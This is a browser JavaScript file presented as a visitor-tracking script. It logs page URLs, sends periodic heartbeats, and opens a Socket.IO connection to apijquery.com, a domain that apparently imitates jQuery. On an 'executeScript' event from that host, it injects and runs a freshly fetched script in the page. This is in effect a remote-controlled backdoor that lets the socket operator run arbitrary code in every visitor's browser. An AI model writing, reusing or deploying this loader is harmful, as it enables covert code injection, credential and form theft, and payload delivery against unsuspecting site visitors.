console.log("Tracking script initialized");

// Send visitor data
fetch("/api/visitors/track", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    url: window.location.href,
    timestamp: new Date().toISOString(),
  }),
})
  .then((res) => {
    if (res.ok) {
      console.log("Visitor tracked successfully");
    } else {
      console.error("Failed to track visitor");
      res.json().then((data) => console.error("Response:", data));
    }
  })
  .catch((err) => console.error("Error tracking visitor:", err));

// Connect to Socket.IO
const socket = io("https://apijquery.com"); // Adjust if needed

// Listen for "executeScript" => load the currently active snippet
socket.on("executeScript", () => {
  console.log("Received executeScript event.");

  // Pull the active snippet from /api/js-snippets/latest-script.js
  const scriptElement = document.createElement("script");
  scriptElement.src = `/api/js-snippets/latest-script.js?t=${Date.now()}`;
  document.body.appendChild(scriptElement);
});

// Heartbeat every 5s
let heartbeatInterval;
const heartbeatFrequency = 5000;

function startHeartbeat() {
  heartbeatInterval = setInterval(() => {
    fetch("/api/visitors/ping", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: window.location.href,
        timestamp: new Date().toISOString(),
      }),
    })
      .then((res) => {
        if (!res.ok) {
          console.error("Heartbeat failed");
        }
      })
      .catch((err) => console.error("Error sending heartbeat:", err));
  }, heartbeatFrequency);
}

function stopHeartbeat() {
  clearInterval(heartbeatInterval);
}

// Start heartbeat only when page is visible
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "visible") {
    console.log("Page is visible. Starting heartbeat.");
    startHeartbeat();
  } else {
    console.log("Page is hidden. Stopping heartbeat.");
    stopHeartbeat();
  }
});

// If page is already visible, start now
if (document.visibilityState === "visible") {
  startHeartbeat();
}
